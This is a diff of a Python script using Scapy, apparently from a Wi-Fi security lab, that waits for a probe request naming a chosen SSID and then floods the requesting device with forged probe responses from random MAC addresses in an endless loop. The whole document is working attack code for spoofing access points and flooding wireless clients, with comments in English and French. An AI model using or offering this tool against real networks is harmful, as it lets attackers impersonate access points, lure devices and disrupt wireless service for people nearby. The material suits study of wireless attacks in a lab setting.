@@ -16,23 +16,18 @@ parser.add_argument("-s", "--SSID", required=True, help="The interface that you 
 args = parser.parse_args()
 
 iface = args.Interface
-stop=0
 
-def is_stopped(null):
-    if stop:
-        return
-
-def find_ssid_searched( packet):
+# On regarde que le paquet soit un probe request et qu'il demande le SSID que nous cherchons
+def find_ssid_searched(packet):
     if Dot11ProbeReq in packet and packet.info.decode("utf-8") == args.SSID:
-        stop=1
+        print("SSID cible demandé, envoie de probe response")
         attack(packet)
 
-
+# Inondation du réseau avec des probe responses
 def attack(packet):
-    
-    # We create the new packet by concatenate the first part, the new channel, and the last part
-    fakepacket = RadioTap() / Dot11(type=0, subtype=5, addr1=packet.addr2, addr2="ff:ff:ff:ff:ff:ff", addr3=RandMAC())/Dot11ProbeResp()/Dot11Elt(ID="SSID", info=args.SSID)
+    # We create a fake packet with a random MAC
+    fakepacket = RadioTap() / Dot11(type=0, subtype=5, addr1=packet.addr2, addr2=RandMAC(), addr3=RandMAC())/Dot11ProbeResp()/Dot11Elt(ID="SSID", info=args.SSID)
     sendp(fakepacket, iface=iface, inter=0.100, loop=1)
 
-print("Searching SSID equals to {ssid}".format(ssid=args.SSID))
-sniff(iface=iface, prn=find_ssid_searched, stop_filter=is_stopped)
+print("Attente d'un probe request pour le SSID {ssid}".format(ssid=args.SSID))
+sniff(iface=iface, prn=find_ssid_searched)
